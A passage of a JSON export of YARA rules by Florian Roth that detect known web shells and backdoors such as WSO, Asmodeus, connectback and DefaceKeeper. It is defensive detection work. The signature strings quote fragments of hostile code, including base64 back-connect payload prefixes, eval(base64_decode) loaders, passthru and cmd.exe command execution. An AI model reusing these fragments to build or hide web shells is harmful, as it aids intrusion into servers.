Team.php.txt","minimum_yara":"1.7","name":"Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C","reference":"-","required_modules":[],"rule_hash":"9fb8c63b434029f4c253afae5d136503","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Asmodeus_v0_1_pl_RID30B7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Asmodeus v0.1.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[url=http://www.governmentsecurity.org\" \n      $s1 = \"perl asmodeus.pl client 6666 127.0.0.1\" \n      $s2 = \"print \\\"Asmodeus Perl Remote Shell\" \n      $s4 = \"$internet_addr = inet_aton(\\\"$host\\\") or die \\\"ALOA:$!\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 12:51:41","description":"Semi-Auto-generated - file Asmodeus v0.1.pl.txt","minimum_yara":"1.7","name":"Webshell_Asmodeus_v0_1_pl_RID30B7","reference":"-","required_modules":[],"rule_hash":"e2a204a3975937fc43b7f0a264677bf0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_backup_php_often_with_c99shell_RID36A5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backup.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#phpMyAdmin MySQL-Dump\" fullword\n      $s2 = \";db_connect();header('Content-Type: application/octetstr\" \n      $s4 = \"$data .= \\\"#Database: $database\" fullword\n   condition: \n      all of them\n}","date":"2014-03-29 17:04:41","description":"Semi-Auto-generated - file backup.php.php.txt","minimum_yara":"1.7","name":"Webshell_backup_php_often_with_c99shell_RID36A5","reference":"-","required_modules":[],"rule_hash":"32597959ac5f6336ac407af571ccfc63","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Reader_asp_RID2E9C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Reader.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mehdi & HolyDemon\" \n      $s2 = \"www.infilak.\" \n      $s3 = \"'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\\\"75%\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:21:51","description":"Semi-Auto-generated - file Reader.asp.txt","minimum_yara":"1.7","name":"Webshell_Reader_asp_RID2E9C","reference":"-","required_modules":[],"rule_hash":"8c63ed354bbf0b6bf271d52ed08f35e3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jspshall_jsp_RID2FB3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file jspshall.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kj021320\" \n      $s1 = \"case 'T':systemTools(out);break;\" \n      $s2 = \"out.println(\\\"<tr><td>\\\"+ico(50)+f[i].getName()+\\\"</td><td> file\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:08:21","description":"Semi-Auto-generated - file jspshall.jsp.txt","minimum_yara":"1.7","name":"Webshell_jspshall_jsp_RID2FB3","reference":"-","required_modules":[],"rule_hash":"781984c33389d8239cf3cab50b8176eb","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Webshell_php_Blocker_RID32A4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file webshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:13:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<die(\\\"Couldn't Read directory, Blocked!!!\\\");\" \n      $s3 = \"PHP Web Shell\" \n   condition: \n      all of them\n}","date":"2014-03-29 14:13:51","description":"Semi-Auto-generated - file webshell.php.txt","minimum_yara":"1.7","name":"Webshell_Webshell_php_Blocker_RID32A4","reference":"-","required_modules":[],"rule_hash":"615a4c17da38e7fed515c664c0fa323c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_shells_PHP_wso_RID3030 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file wso.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$back_connect_p=\\\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi\" \n      $s3 = \"echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:29:11","description":"Semi-Auto-generated - file wso.txt","minimum_yara":"1.7","name":"Webshell_shells_PHP_wso_RID3030","reference":"-","required_modules":[],"rule_hash":"9f2f0bbf599ffee29f61aa5ade30da16","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_indexer_asp_RID2F38 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file indexer.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input typ\" \n      $s2 = \"D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\\\"submit\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:47:51","description":"Semi-Auto-generated - file indexer.asp.txt","minimum_yara":"1.7","name":"Webshell_indexer_asp_RID2F38","reference":"-","required_modules":[],"rule_hash":"370fb08eef1e108af5f5c21b29cca45c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpshell17_php_RID3015 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpshell17.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p>\" fullword\n      $s1 = \"<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></\" \n      $s2 = \"href=\\\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:24:41","description":"Semi-Auto-generated - file phpshell17.php.txt","minimum_yara":"1.7","name":"Webshell_phpshell17_php_RID3015","reference":"-","required_modules":[],"rule_hash":"ea09df759c584050beb2a560c05cec62","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_myshell_php_php_RID30F2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file myshell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:01:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@chdir($work_dir) or ($shellOutput = \\\"MyShell: can't change directory.\" \n      $s1 = \"echo \\\"<font color=$linkColor><b>MyShell file editor</font> File:<font color\" \n      $s2 = \" $fileEditInfo = \\\"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:01:31","description":"Semi-Auto-generated - file myshell.php.php.txt","minimum_yara":"1.7","name":"Webshell_myshell_php_php_RID30F2","reference":"-","required_modules":[],"rule_hash":"345b2927ef2dff24cf7033ec0f444f2d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:07:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Simorgh Security Magazine \" \n      $s1 = \"Simshell.css\" \n      $s2 = \"} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], \" \n      $s3 = \"www.simorgh-ev.com\" \n   condition: \n      2 of them\n}","date":"2014-03-29 19:07:41","description":"Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt","minimum_yara":"1.7","name":"Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987","reference":"-","required_modules":[],"rule_hash":"3331eb9cc05889b0f918349bec9e5d09","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_rootshell_php_RID3029 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file rootshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"shells.dl.am\" \n      $s1 = \"This server has been infected by $owner\" \n      $s2 = \"<input type=\\\"submit\\\" value=\\\"Include!\\\" name=\\\"inc\\\"></p>\" \n      $s4 = \"Could not write to file! (Maybe you didn't enter any text?)\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:28:01","description":"Semi-Auto-generated - file rootshell.php.txt","minimum_yara":"1.7","name":"Webshell_rootshell_php_RID3029","reference":"-","required_modules":[],"rule_hash":"b79b77cdbc546dd0ce00e3b7c969ef89","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_connectback2_pl_RID308E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file connectback2.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   \" \n      $s1 = \"echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel\" \n      $s2 = \"ConnectBack Backdoor\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:44:51","description":"Semi-Auto-generated - file connectback2.pl.txt","minimum_yara":"1.7","name":"Webshell_connectback2_pl_RID308E","reference":"-","required_modules":[],"rule_hash":"3aebcc815380f3f2ab69ef4b004e98fe","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_DefaceKeeper_0_2_php_RID3201 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DefaceKeeper_0.2.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"target fi1e:<br><input type=\\\"text\\\" name=\\\"target\\\" value=\\\"index.php\\\"></br>\" fullword\n      $s1 = \"eval(base64_decode(\\\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9\" \n      $s2 = \"<img src=\\\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\\\" align=\\\"center\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:46:41","description":"Semi-Auto-generated - file DefaceKeeper_0.2.php.txt","minimum_yara":"1.7","name":"Webshell_DefaceKeeper_0_2_php_RID3201","reference":"-","required_modules":[],"rule_hash":"e381cba4bbf69722a703222f6e19c9ca","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_DxShell_php_php_RID30A8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DxShell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s2 = \"print \\\"\\\\n\\\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:49:11","description":"Semi-Auto-generated - file DxShell.php.php.txt","minimum_yara":"1.7","name":"Webshell_DxShell_php_php_RID30A8","reference":"-","required_modules":[],"rule_hash":"5517579d243a70a985430bf4e7c34cf2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_kacak_asp_RID2E44 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file kacak.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Kacak FSO 1.0\" \n      $s1 = \"if request.querystring(\\\"TGH\\\") = \\\"1\\\" then\" \n      $s3 = \"<font color=\\\"#858585\\\">BuqX</font></a></font><font face=\\\"Verdana\\\" style=\" \n      $s4 = \"mailto:BuqX@hotmail.com\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:07:11","description":"Semi-Auto-generated - file kacak.asp.txt","minimum_yara":"1.7","name":"Webshell_kacak_asp_RID2E44","reference":"-","required_modules":[],"rule_hash":"456ff4a7a91f4da651319e3022be42c5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_Backdoor_Connect_pl_php_RID351D : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LorD of IRAN HACKERS SABOTAGE\" \n      $s1 = \"LorD-C0d3r-NT\" \n      $s2 = \"echo --==Userinfo==-- ;\" \n   condition: \n      1 of them\n}","date":"2014-03-29 15:59:21","description":"Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt","minimum_yara":"1.7","name":"Webshell_PHP_Backdoor_Connect_pl_php_RID351D","reference":"-","required_modules":[],"rule_hash":"fbca35ed7b99876d07d33b1cd0fff20f","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_backdoor1_php_RID2FC3 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backdoor1.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:11:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"[DIR] <A HREF=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?rep=\\\".realpath($rep.\\\"..\" \n      $s2 = \"class backdoor {\" \n      $s4 = \"echo \\\"<a href=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?copy=1\\\\\\\">Copier un fichier</a> <\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:11:01","description":"Semi-Auto-generated - file backdoor1.php.txt","minimum_yara":"1.7","name":"Webshell_backdoor1_php_RID2FC3","reference":"-","required_modules":[],"rule_hash":"7686df6b5f61f28074319300cb32fe10","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_elmaliseker_asp_RID30D7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file elmaliseker.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \\\"@\\\" & makeText(8) & \\\".\\\"\" \n      $s1 = \"<form name=frmCMD method=post action=\\\"<%=gURL%>\\\">\" \n      $s2 = \"dim zombie_array,special_array\" \n      $s3 = \"http://vnhacker.org\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:57:01","description":"Semi-Auto-generated - file elmaliseker.asp.txt","minimum_yara":"1.7","name":"Webshell_elmaliseker_asp_RID30D7","reference":"-","required_modules":[],"rule_hash":"74600daa6ce6e926142009ad1fb6c490","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_s72_Shell_v1_1_Coding_html_RID3436 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:20:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Dizin</font></b></font><font face=\\\"Verdana\\\" style=\\\"font-size: 8pt\\\"><\" \n      $s1 = \"s72 Shell v1.0 Codinf by Cr@zy_King\" \n      $s3 = \"echo \\\"<p align=center>Dosya Zaten Bulunuyor</p>\\\"\" \n   condition: \n      1 of them\n}","date":"2014-03-29 15:20:51","description":"Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt","minimum_yara":"1.7","name":"Webshell_s72_Shell_v1_1_Coding_html_RID3436","reference":"-","required_modules":[],"rule_hash":"a8ee0bc1ba69596223e98243c72a6aac","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Antichat_Socks5_Server_php_php_RID368D : DEMO T1090 T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1090, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);\" fullword\n      $s3 = \"#   [+] Domain name address type\" \n      $s4 = \"www.antichat.ru\" \n   condition: \n      1 of them\n}","date":"2014-03-29 17:00:41","description":"Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt","minimum_yara":"1.7","name":"Webshell_Antichat_Socks5_Server_php_php_RID368D","reference":"-","required_modules":[],"rule_hash":"b31085b3df7027f11b9044933dfa0900","score":75,"tags":["T1100","T1090","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Antichat_Shell_v1_3_php_RID3368 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Antichat Shell v1.3.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:46:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Antichat\" \n      $s1 = \"Can't open file, permission denide\" \n      $s2 = \"$ra44\" \n   condition: \n      2 of them\n}","date":"2014-03-29 14:46:31","description":"Semi-Auto-generated - file Antichat Shell v1.3.php.txt","minimum_yara":"1.7","name":"Webshell_Antichat_Shell_v1_3_php_RID3368","reference":"-","required_modules":[],"rule_hash":"c45847d7c44ffa336e1cc042dd7bb829","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\" \n      $s1 = \"Mode Shell v1.0</font></span>\" \n      $s2 = \"has been already loaded. PHP Emperor <xb5@hotmail.\" \n   condition: \n      1 of them\n}","date":"2014-03-29 19:30:01","description":"Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt","minimum_yara":"1.7","name":"Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D","reference":"-","required_modules":[],"rule_hash":"cbc0b6e310fefbe3cf6fc574ddf7d6d6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cmd_asp_5_1_asp_RID3044 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cmd-asp-5.1.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Call oS.Run(\\\"win.com cmd.exe /c del \\\"& szTF,0,True)\" fullword\n      $s3 = \"Call oS.Run(\\\"win.com cmd.exe /c \\\"\\\"\\\" & szCMD & \\\" > \\\" & szTF &\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:32:31","description":"Semi-Auto-generated - file cmd-asp-5.1.asp.txt","minimum_yara":"1.7","name":"Webshell_cmd_asp_5_1_asp_RID3044","reference":"-","required_modules":[],"rule_hash":"c3e67edcbaff7500f30094cd422d57eb","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_Shell_php_php_RID3133 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHP Shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"</form><form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"post\\\\\\\"><input\" \n      $s1 = \"echo \\\"<form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"POST\\\\\\\"><input type=\" \n   condition: \n      all of them\n}","date":"2014-03-29 13:12:21","description":"Semi-Auto-generated - file PHP Shell.php.php.txt","minimum_yara":"1.7","name":"Webshell_PHP_Shell_php_php_RID3133","reference":"-","required_modules":[],"rule_hash":"fcab692cf40bfa5b9b34bfc5acc607ad","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_EFSO_2_asp_RID2E07 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file EFSO_2.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Ejder was HERE\" \n      $s1 = \"*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~\" \n   condition: \n      2 of them\n}","date":"2014-03-29 10:57:01","description":"Semi-Auto-generated - file EFSO_2.asp.txt","minimum_yara":"1.7","name":"Webshell_EFSO_2_asp_RID2E07","reference":"-","required_modules":[],"rule_hash":"8bf184090f9a6aa3d31a54dd60f489a6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_lamashell_php_RID3000 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file lamashell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lama's'hell\" fullword\n      $s1 = \"if($_POST['king'] == \\\"\\\") {\" \n      $s2 = \"if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\\\"/\\\".$_FILES['f\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:21:11","description":"Semi-Auto-generated - file lamashell.php.txt","minimum_yara":"1.7","name":"Webshell_lamashell_php_RID3000","reference":"-","required_modules":[],"rule_hash":"1e3d2e387c194edef63980abbc9a780d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_mysql_php_php_RID302A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"action=mysqlread&mass=loadmass\\\">load all defaults\" \n      $s2 = \"if (@passthru($cmd)) { echo \\\" -->\\\"; $this->output_state(1, \\\"passthru\" \n      $s3 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = \" \n   condition: \n      1 of 